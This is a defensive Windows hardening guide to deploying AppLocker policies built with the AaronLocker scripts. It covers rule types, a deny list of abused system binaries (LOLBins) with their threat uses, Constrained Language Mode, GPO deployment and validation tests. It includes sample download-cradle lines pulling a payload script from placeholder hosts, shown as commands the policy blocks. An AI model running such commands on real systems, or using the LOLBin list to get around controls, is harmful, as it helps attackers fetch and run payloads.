# AppLocker with AaronLocker Implementation Guide

## Overview

This document provides comprehensive guidance for implementing application control using AppLocker with the AaronLocker framework. The policies generated by AaronLocker create a robust application allowlisting strategy that restricts non-administrative users to running only authorized software while blocking known Living Off the Land Binaries (LOLBins) commonly abused by threat actors.

The AaronLocker-generated AppLocker policy accomplishes the following objectives:

- Allows execution from trusted locations (`%WINDIR%`, `%PROGRAMFILES%`) while explicitly blocking user-writable subdirectories within those paths
- Blocks 35+ Microsoft-signed LOLBins that are commonly abused for code execution, persistence, and defense evasion
- Enforces PowerShell Constrained Language Mode for non-administrative users
- Permits trusted publisher-signed software through cryptographic signature validation
- Provides hash-based rules for specific unsigned files that require execution
- Grants administrators unrestricted execution rights for system management

---

## What is AaronLocker?

AaronLocker is a set of PowerShell scripts and documentation designed to make Windows application whitelisting with AppLocker dramatically easier and more practical. It addresses the real-world challenges that have historically made AppLocker deployments difficult to implement and maintain.

AppLocker provides powerful application control capabilities, but out of the box it requires significant manual effort to create and maintain policies. AaronLocker fills this management gap by providing a complete, production-ready toolkit for creating robust AppLocker policies. Developed by Aaron Margosis at Microsoft, it transforms AppLocker from a powerful-but-impractical feature into a deployable security control.

**Source**: [GitHub - microsoft/AaronLocker](https://github.com/microsoft/AaronLocker)

### Video Resources

1. [Intro to 'AaronLocker'](https://youtu.be/nQyODwPR5qo) (7 min, circa Feb. 2019)
2. [AaronLocker Quick Start](https://youtu.be/E-IrqFtJOKU) (13 min, circa Feb. 2019)

### Additional Microsoft Documentation

- [AppLocker Overview](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/applocker-overview)
- [AppLocker Rule Collection Extensions](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/rule-collection-extensions)

---

## Understanding AppLocker Scope and Limitations

### User-Land Protection (Ring 3)

AppLocker operates exclusively in user-land (Ring 3) and is designed to prevent **standard users** from executing unauthorized software. It addresses the following scenarios:

- **Shadow IT Prevention**: Stops users from running unapproved applications, portable executables, or downloaded software
- **Malware Execution Prevention**: Blocks execution of malicious binaries delivered through phishing, web downloads, or removable media
- **Script Control**: Restricts PowerShell, VBScript, JScript, and batch file execution to approved scripts and locations

### What AppLocker Is NOT

AppLocker is not a replacement for Antivirus (e.g. Microsoft Defender AntiVirus - MDAV), endpoint detection and response (EDR), or Attack Surface Reduction (ASR) rules. It does not inspect file contents for malicious code, does not prevent kernel-mode attacks (Ring 0), and does not provide runtime behavioral monitoring. Once a binary or script begins execution, AppLocker takes no further action—it is a proactive control ("left of bang") that prevents unauthorized program launch, not a reactive control ("right of bang") that monitors or terminates running processes. AppLocker is one layer in a defense-in-depth strategy and should be combined with antimalware solutions, EDR, and other security controls.

---

## Rule Types in AaronLocker

AaronLocker supports three methods for authorizing software execution. Understanding when to use each type is essential for maintaining a secure and manageable policy.

### 1. Publisher Rules (Recommended)

Publisher rules use digital signatures to authorize software and are the most flexible and maintainable rule type. They survive software updates because they validate the cryptographic signature rather than specific file attributes.

**Configuration Location**: `CustomizationInputs/TrustedSigners.ps1`

**Granularity Levels**:

| Level | Description | Use Case |
|-------|-------------|----------|
| `pubOnly` | Trust all files from a publisher | Large vendors with consistent signing practices |
| `pubProduct` | Trust all files for a specific product | Individual applications (e.g., Microsoft Teams) |
| `pubProductBinary` | Trust a specific binary name (default) | Individual executables requiring authorization |
| `pubProdBinVer` | Trust a specific binary at minimum version | Applications requiring version enforcement |

**Example - Trusting a Publisher**:
```powershell
# Trust all files signed by Adobe
@{
    label = "Adobe Applications";
    PublisherName = "O=ADOBE INC., L=SAN JOSE, S=CA, C=US";
}
```

**Example - Trusting a Specific Product**:
```powershell
# Trust an application running outside of the accepted / default paths for standard users
# https://windirstat.net/download.html
@{
     label = "WinDirStat";
     paths = "C:\WinDirStat";
     pubruleGranularity = "pubProdBinVer";
}
```

```powershell
# Trust Microsoft Teams product specifically
@{
    label = "Microsoft Teams";
    PublisherName = "O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US";
    ProductName = "MICROSOFT TEAMS";
}
```

**Example - Using an Exemplar File**:
```powershell
# Extract publisher info from an existing signed file
@{
    label = "Sysinternals Tools";
    exemplar = "C:\Tools\Sysinternals\Autoruns.exe";
}
```

### 2. Path Rules

Path rules authorize execution based on file system location. AaronLocker uses path rules for trusted system directories while explicitly excluding user-writable subdirectories.

**Configuration Location**: `CustomizationInputs/GetSafePathsToAllow.ps1`

Path rules are appropriate for:
- Network shares containing approved software (e.g., `\\domain\netlogon\*`)
- Additional program directories not covered by default rules
- Administrative deployment locations

**Example - Adding a Safe Path**:
```powershell
# Allow execution from a trusted network share
"\\MYSERVER\ApprovedApps\*"

# Allow execution from a custom program directory
"C:\ProgramData\CompanyApps\*"
```

**Warning**: Only add paths that are not writable by non-administrative users. AaronLocker automatically scans for user-writable directories and excludes them from allow rules.

### 3. Hash Rules

Hash rules authorize specific files based on their SHA256 cryptographic hash. Use hash rules only when publisher rules are not possible (unsigned files or files without version information).

**Configuration Location**: `CustomizationInputs/HashRuleData.ps1`

**Limitations**:
- Hash rules break when files are updated (new version = new hash)
- Require manual maintenance for each software update
- Should be used sparingly as a last resort

**Example - Adding a Hash Rule**:
```powershell
@{
    RuleCollection = "Script";  # Case-sensitive: Exe, Dll, Script, or Msi
    RuleName = "Custom Backup Script";
    RuleDesc = "Identified in: C:\Scripts\backup.cmd";
    HashVal = "0x4CA1CD60FBFBA42C00EA6EA1B56BEFE6AD90FE0EFF58285A75D77B515D864DAE";
    FileName = "backup.cmd"
}
```

---

## Writeable Path Restrictions

AaronLocker automatically identifies and blocks user-writable subdirectories within `%WINDIR%` and `%PROGRAMFILES%`. This prevents attackers from placing malicious files in overlooked writable locations within trusted paths.

### Blocked Writable Directories in C:\Windows

The following locations are explicitly excluded from the Windows folder allow rule:

| Path | Reason |
|------|--------|
| `%WINDIR%\Temp\*` | Temporary files directory - user writable |
| `%WINDIR%\Tasks\*` | Scheduled tasks directory |
| `%WINDIR%\Tracing\*` | Tracing logs directory |
| `%WINDIR%\Registration\CRMLog\*` | COM+ registration logs |
| `%WINDIR%\ServiceState\*` | Service state data |
| `%SYSTEM32%\Tasks\*` | System scheduled tasks |
| `%SYSTEM32%\Spool\*` | Print spooler (including Alternate Data Streams) |
| `%SYSTEM32%\Com\dmp\*` | COM+ dump files |
| `%SYSTEM32%\Microsoft\Crypto\RSA\MachineKeys\*` | Cryptographic key storage |
| `%SYSTEM32%\Drivers\DriverData\*` | Driver data storage |

### Alternate Data Stream (ADS) Protection

AaronLocker also blocks execution from Alternate Data Streams on writable directories (noted with `:*` suffix), preventing a common technique used to hide malicious code within NTFS metadata.

---

## Rule Processing Order

AppLocker processes rules in a specific order that determines whether a file is allowed or blocked:

### Processing Sequence

1. **Explicit Deny Rules** - Evaluated first; if matched, execution is blocked regardless of any allow rules
2. **Explicit Allow Rules** - Evaluated second; if matched and not denied, execution is permitted
3. **Implicit Deny** - If no rules match, execution is blocked by default

### Key Implications

- **Deny rules always win**: A file matching both a deny and allow rule will be blocked
- **LOLBin blocks are explicit denies**: They appear first in the policy and cannot be overridden by path rules
- **Administrators bypass**: The default administrator rule (`S-1-5-32-544`) with path `*` allows all execution for local administrators

### Rule Order in the AaronLocker Policy

```
1. LOLBin Deny Rules (Publisher-based, Action="Deny")
   └── Block mshta.exe, cscript.exe, MSBuild.exe, cipher.exe, etc.
   
2. Administrator Allow Rule (Path-based, Action="Allow")
   └── Allow all files for BUILTIN\Administrators
   
3. Path Allow Rules with Exceptions (Action="Allow")
   └── %PROGRAMFILES%\* (minus writable subdirectories)
   └── %WINDIR%\* (minus writable subdirectories and LOLBin exceptions)
   
4. Publisher Allow Rules (Action="Allow")
   └── Trusted signers, products, and specific binaries
   
5. Hash Allow Rules (Action="Allow")
   └── Specific unsigned files by SHA256 hash

6. Implicit Deny (no rule matched)
   └── Execution blocked
```

---

## LOLBin Blocking

### What are LOLBins?

LOLBins (Living Off the Land Binaries) are legitimate, Microsoft-signed system utilities that attackers abuse to execute malicious actions while evading detection. Because these binaries are trusted components of Windows, they are often overlooked by security tools and allowlisted by default. Threat actors leverage LOLBins to download payloads, execute arbitrary code, bypass application controls, and maintain persistence—all without deploying custom malware that might trigger antivirus alerts.

Microsoft publishes a recommended block list of applications that can be abused to bypass application control policies. The AaronLocker-enhanced policy implements these blocks using publisher-based deny rules that match the binary name regardless of file path or version, ensuring comprehensive coverage.

**Reference**: [Microsoft Recommended Block Rules](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/design/applications-that-can-bypass-appcontrol)

### Why Block LOLBins?

The policy blocks 35+ Microsoft-signed binaries that are commonly abused by threat actors for:

- **Code Execution**: Running arbitrary code through legitimate system utilities
- **Defense Evasion**: Bypassing security controls using trusted binaries
- **Persistence**: Establishing footholds using built-in tools
- **Credential Access**: Extracting or manipulating credentials

### Blocked Executables

| Binary | Threat Use |
|--------|-----------|
| `mshta.exe` | Execute malicious HTA files, inline VBScript/JScript |
| `cscript.exe` / `wscript.exe` | Windows Script Host - execute VBS/JS malware |
| `MSBuild.exe` | Compile and execute inline C# code |
| `InstallUtil.exe` | .NET installer abuse for code execution |
| `RegAsm.exe` / `RegSvcs.exe` | .NET assembly registration abuse |
| `cipher.exe` | Data exfiltration, secure deletion |
| `wmic.exe` | WMI command-line abuse |
| `bash.exe` / `wsl.exe` | Windows Subsystem for Linux escape |
| `cdb.exe` / `windbg.exe` / `kd.exe` | Debugger abuse |
| `dotnet.exe` | .NET CLI for code compilation/execution |
| `runas.exe` | Credential exposure risk |

### Blocked DLLs (with DLL Rule Enforcement)

| DLL | Purpose |
|-----|---------|
| `lxssmanager.dll` | WSL manager library |
| `Microsoft.Build.dll` | MSBuild core library |
| `Microsoft.Build.Framework.dll` | MSBuild framework |
| `msbuild.dll` | MSBuild additional library |
| `system.management.automation.dll` | PowerShell v2 engine |

---

## PowerShell Constrained Language Mode

When AppLocker script rules are enforced, PowerShell automatically operates in Constrained Language Mode (CLM) for non-administrative users. CLM restricts dangerous capabilities while maintaining basic functionality for legitimate administrative scripts.

### What CLM Restricts

In Constrained Language Mode:

- **Direct use of arbitrary .NET types** like `[System.Net.WebClient]` is not allowed
- **Method invocation on non-core types** (like `::new()` and `.DownloadString()`) is blocked
- **COM object instantiation** is prohibited
- **Add-Type** cannot be used to compile and load arbitrary .NET code
- **Reflection** cannot be used to bypass restrictions
- **Inline C# or other language code** cannot be executed

### What CLM Allows

Only a small set of "core" types and operations are permitted:

- Basic strings and string manipulation
- Arrays and array operations
- Hashtables
- Basic arithmetic and comparison operators
- Standard cmdlets that don't require restricted .NET access

This design specifically prevents attackers from pulling and executing code from the internet or accessing sensitive system APIs through PowerShell.

### Example - Blocked CLM Operation

```powershell
# This command will FAIL in Constrained Language Mode:
[System.Net.WebClient]::new().DownloadString('http://malicious.site/payload.ps1')
```

**Error Output**:
```
Cannot invoke method. Method invocation is supported only on core types in this language mode.
```

(Exact wording may vary by PowerShell version, but the behavior is consistent.)

### Demonstrating CLM Behavior

To safely demonstrate CLM restrictions, use a benign URL while keeping the structure that CLM will block:

```powershell
# Check current language mode first
$ExecutionContext.SessionState.LanguageMode

# Attempt to download content (will fail in CLM, succeed in FullLanguage)
[System.Net.WebClient]::new().DownloadString('https://example.com/test.txt')
```

**In FullLanguage mode**: The command executes successfully and downloads the content.

**In ConstrainedLanguage mode**: The command fails with a method invocation error, demonstrating that the language mode—not the URL—is what's being enforced.

This illustrates how CLM prevents remote content retrieval via .NET regardless of whether the target is malicious or benign.

### Verifying CLM Status

```powershell
# Check current language mode
$ExecutionContext.SessionState.LanguageMode

# Expected output for non-admin under AppLocker:
# ConstrainedLanguage

# Expected output for administrators or without AppLocker:
# FullLanguage
```

### CLM Bypass Considerations

Administrators running PowerShell will still operate in FullLanguage mode due to the default AppLocker rule allowing all execution for the Administrators group. This is by design—administrators need unrestricted PowerShell access for system management. CLM specifically targets standard users who should not have access to advanced .NET capabilities.

---

## Policy Creation

### Prerequisites

- Windows PowerShell 5.1 (not PowerShell Core)
- Sysinternals AccessChk.exe (for scanning writable directories)
- Administrative rights on the scanning machine

### Generating the Policy

1. **Download AccessChk.exe** (if not present):
```powershell
.\Support\DownloadAccesschk.ps1
```

2. **Configure Custom Rules** (optional):
   - Edit `CustomizationInputs\TrustedSigners.ps1` for publisher rules
   - Edit `CustomizationInputs\GetSafePathsToAllow.ps1` for additional paths
   - Edit `CustomizationInputs\UnsafePathsToBuildRulesFor.ps1` for user-writable paths requiring rules
   - Edit `CustomizationInputs\HashRuleData.ps1` for hash rules

3. **Run the Policy Generator**:
```powershell
# Open an Administrator PowerShell session
# Navigate to the AaronLocker directory

# First-time run (performs writable directory scan):
.\Create-Policies.ps1 -Rescan

# Subsequent runs (uses cached scan results):
.\Create-Policies.ps1
```

**Generate Excel Documentation** (optional but recommended):

Add the `-Excel` switch to generate formatted Excel spreadsheets alongside the XML policies. The spreadsheets provide a human-readable format for rule review, sorting, filtering, and change tracking:

```powershell
# Generate policies with Excel documentation:
.\Create-Policies.ps1 -Excel

# First-time run with Excel output:
.\Create-Policies.ps1 -Rescan -Excel

# Generate rules for a specific user profile (for user-writable path scanning):
.\Create-Policies.ps1 -ForUser username -Excel
```

The Excel files are saved to the `Outputs\` directory with the same timestamp as the XML policies, making it easy to track which spreadsheet corresponds to which policy version.

4. **Locate Generated Policies**:
```
Outputs\
├── AppLockerRules-YYYYMMDD-HHMM-Audit.xml
├── AppLockerRules-YYYYMMDD-HHMM-Enforce.xml
├── AppLockerRules-YYYYMMDD-HHMM-Audit.xlsx    (if -Excel specified)
└── AppLockerRules-YYYYMMDD-HHMM-Enforce.xlsx  (if -Excel specified)
```

### Audit vs. Enforce Policies

Both policy files contain identical rules—the only difference is the `EnforcementMode` attribute:

| Policy Type | EnforcementMode | Behavior |
|-------------|-----------------|----------|
| Audit | `AuditOnly` | Logs violations but allows execution (Event ID 8003) |
| Enforce | `Enabled` | Blocks execution and logs events (Event ID 8004) |

**Recommended Deployment Approach**:
1. Deploy Audit policy first
2. Monitor Event ID 8003 entries for false positives
3. Adjust rules as needed
4. Deploy Enforce policy once validated

---

## Policy Deployment

### Domain-Joined Environments (Group Policy)

1. **Create or Edit a GPO**:
   - Open Group Policy Management Console (`gpmc.msc`)
   - Create a new GPO or edit an existing one
   - Navigate to: `Computer Configuration → Policies → Windows Settings → Security Settings → Application Control Policies → AppLocker`

2. **Import the Policy**:
   - Right-click on `AppLocker` → `Import Policy...`
   - Select the generated XML file (Audit or Enforce)
   - Click `OK` to import

3. **Configure Rule Enforcement**:
   - Expand `AppLocker` and click on each rule collection (Executable, Windows Installer, Script, DLL)
   - Right-click → `Properties`
   - Verify enforcement mode matches your intent (Audit or Enforce)

4. **Enable the Application Identity Service**:
   
   AppLocker requires the Application Identity service (AppIDSvc) to be running. Configure this via GPO to ensure it starts automatically on all target machines:
   
   - Navigate to: `Computer Configuration → Policies → Windows Settings → Security Settings → System Services`
   - Find `Application Identity` in the list
   - Double-click to open properties
   - Select `Define this policy setting`
   - Set service startup mode to `Automatic`
   - Click `OK`
   
   **Important**: Without the Application Identity service running, AppLocker rules will not be enforced regardless of policy configuration.

5. **Link the GPO to Target OUs**:
   
   - In Group Policy Management Console, right-click the target OU (e.g., `Workstations`)
   - Select `Link an Existing GPO...`
   - Select your AppLocker GPO and click `OK`
   
   **Recommended OU Targeting**:
   - Link to workstation OUs rather than the domain root
   - Exclude server OUs initially to prevent unintended application blocks
   - Consider creating a pilot OU for initial testing with a subset of machines
   
   **Force Policy Update on Target Machines**:
   ```cmd
   gpupdate /force
   ```

   **Verify Policy Application**:
   ```powershell
   # Check if Application Identity service is running
   Get-Service AppIDSvc | Select-Object Name, Status, StartType
   
   # View effective AppLocker policy
   Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
   ```

**Using the AaronLocker GPO Script**:
```powershell
# Apply policy to an existing GPO
.\GPOConfiguration\Set-GPOAppLockerPolicy.ps1 -GpoName "AppLocker Policy" -Enforce

# For audit mode:
.\GPOConfiguration\Set-GPOAppLockerPolicy.ps1 -GpoName "AppLocker Policy"
```

### Non-Domain (Local) Deployment

For standalone or workgroup machines, apply the policy directly to local Group Policy:

```powershell
# Open an Administrator PowerShell session

# Apply Enforce policy to local GPO:
.\LocalConfiguration\ApplyPolicyToLocalGPO.ps1

# Apply Audit policy to local GPO:
.\LocalConfiguration\ApplyPolicyToLocalGPO.ps1 -AuditOnly

# Configure the Application Identity service:
.\LocalConfiguration\ConfigureForAppLocker.ps1
```

**Manual Local Deployment**:
```powershell
# Import policy directly using Set-AppLockerPolicy
Set-AppLockerPolicy -XmlPolicy ".\Outputs\AppLockerRules-YYYYMMDD-HHMM-Enforce.xml"

# Verify the policy was applied
Get-AppLockerPolicy -Local | Format-List

# Start the Application Identity service
Set-Service -Name AppIDSvc -StartupType Automatic
Start-Service -Name AppIDSvc
```

---

## Testing and Validation

### Pre-Validation Checklist

1. **Application Identity Service** must be running:
```powershell
Get-Service AppIDSvc | Select-Object Name, Status, StartType
# Status should be "Running", StartType should be "Automatic"
```

2. **Run tests as a standard user** (not Administrator):
```powershell
# Check if running as admin
([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
# Should return: False
```

### Using Test-AppLockerLOLBins.ps1

The `Test-AppLockerLOLBins.ps1` script validates that LOLBin blocking is functioning correctly:

```powershell
# Run from a non-admin PowerShell session
.\Test-AppLockerLOLBins.ps1

# With verbose output:
.\Test-AppLockerLOLBins.ps1 -Verbose
```

**Expected Output (Enforce Mode)**:
```
╔══════════════════════════════════════════════════════════════════╗
║       AppLocker LOLBin Block Validation Tests                    ║
╚══════════════════════════════════════════════════════════════════╝

TEST 1: cipher.exe
[PASS] cipher.exe - BLOCKED

TEST 2: mshta.exe  
[PASS] mshta.exe - BLOCKED

TEST 3: MSBuild.exe
[PASS] MSBuild.exe (v4.0.30319 x86) - BLOCKED
[PASS] MSBuild.exe (v4.0.30319 x64) - BLOCKED

TEST 4: cscript.exe
[PASS] cscript.exe - BLOCKED

═══════════════════════════════════════════════════════════════════
SUMMARY: 5/5 tests passed
✅ All tested LOLBins are properly blocked!
```

### Event ID Reference

| Event ID | Log Location | Meaning |
|----------|--------------|---------|
| 8002 | EXE and DLL | File was allowed (Audit mode) |
| 8003 | EXE and DLL | File would have been blocked (Audit mode) |
| 8004 | EXE and DLL | File was blocked (Enforce mode) |
| 8005 | MSI and Script | Script/MSI was allowed |
| 8006 | MSI and Script | Script/MSI would have been blocked (Audit) |
| 8007 | MSI and Script | Script/MSI was blocked (Enforce) |

**Viewing AppLocker Events**:
```powershell
# View recent EXE/DLL events
Get-WinEvent -LogName "Microsoft-Windows-AppLocker/EXE and DLL" -MaxEvents 20 |
    Select-Object TimeCreated, Id, Message | Format-Table -Wrap

# View recent Script events  
Get-WinEvent -LogName "Microsoft-Windows-AppLocker/MSI and Script" -MaxEvents 20 |
    Select-Object TimeCreated, Id, Message | Format-Table -Wrap
```

### Testing User Experience

**Scenario 1: Downloading and Running an Unapproved Executable**

When a user downloads an executable (e.g., a portable application), AppLocker will block execution if no rule permits it:

```
Windows cannot access the specified device, path, or file. You may not have 
the appropriate permissions to access the item.
```

**Scenario 2: PowerShell Constrained Language Mode Verification**

Attempts to use restricted .NET classes will fail:

```powershell
# Attempt to download and execute a script (BLOCKED in CLM)
[System.Net.WebClient]::new().DownloadString('http://runme.io/script.ps1')

# Error output:
# Cannot create type. Only core types are supported in this language mode.
```

**Scenario 3: Running a Blocked LOLBin**

```powershell
# Attempt to run mshta.exe (BLOCKED)
mshta.exe "javascript:alert('test');"

# No output - process is blocked before execution
```

### Troubleshooting Failed Tests

If tests show LOLBins are NOT blocked:

1. **Verify Policy Application**:
```powershell
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
```

2. **Check Application Identity Service**:
```powershell
Get-Service AppIDSvc | Select-Object Status
# Must be "Running"
```

3. **Force Policy Update**:
```powershell
gpupdate /force
```

4. **Confirm Non-Admin Session**:
```powershell
whoami /groups | findstr /i "S-1-5-32-544"
# No output = not an administrator
```

5. **Review Event Logs** for policy application issues:
```powershell
Get-WinEvent -LogName "Microsoft-Windows-AppLocker/EXE and DLL" -MaxEvents 5 |
    Where-Object { $_.Id -in @(8001, 8006, 8007) }
```

---

## Maintenance and Updates

### Adding New Trusted Software

1. Identify the signing certificate (preferred) or file hash
2. Add entry to appropriate configuration file in `CustomizationInputs\`
3. Re-run `Create-Policies.ps1`
4. Deploy updated policy

### Rescanning for Writable Directories

After Windows updates or software installations, rescan for new writable directories:

```powershell
.\Create-Policies.ps1 -Rescan
```

### Comparing Policy Versions

```powershell
.\Compare-Policies.ps1 -ReferencePolicyXML ".\Outputs\OldPolicy.xml" -ComparisonPolicyXML ".\Outputs\NewPolicy.xml" -DifferencesOnly
```

---

## File Reference

| File | Purpose |
|------|---------|
| `Create-Policies.ps1` | Main policy generation script |
| `CustomizationInputs\TrustedSigners.ps1` | Publisher rule definitions |
| `CustomizationInputs\GetSafePathsToAllow.ps1` | Additional safe paths |
| `CustomizationInputs\UnsafePathsToBuildRulesFor.ps1` | User-writable paths needing rules |
| `CustomizationInputs\HashRuleData.ps1` | Hash rule definitions |
| `CustomizationInputs\GetExeFilesToDenyList.ps1` | LOLBin deny list |
| `LocalConfiguration\ApplyPolicyToLocalGPO.ps1` | Local policy deployment |
| `GPOConfiguration\Set-GPOAppLockerPolicy.ps1` | Domain GPO deployment |
| `Test-AppLockerLOLBins.ps1` | Policy validation testing |
